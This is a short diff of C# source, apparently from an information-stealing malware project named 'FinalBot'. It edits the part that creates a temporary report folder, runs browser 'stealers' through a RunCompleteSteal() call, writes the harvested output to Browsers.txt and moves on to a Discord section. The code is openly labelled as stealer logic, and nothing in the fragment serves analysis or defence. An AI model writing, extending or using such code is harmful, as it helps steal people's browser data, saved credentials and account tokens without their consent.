@@ -21,14 +21,14 @@ namespace FinalBot
             string tempDir = Path.Combine(Path.GetTempPath(), $"Report_{DateTime.Now:yyyyMMdd_HHmmss}");
             try 
             {
-                Directory.CreateDirectory(tempDir);
+                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
 
                 // 1. Run Stealers
                 // Browsers
                 try {
                     var browserService = new DataService();
-                    string browserReport = await browserService.RunAll();
-                    File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), browserReport);
+                    var result = await browserService.RunCompleteSteal();
+                    File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), result.Message);
                 } catch { }
 
                 // Discord
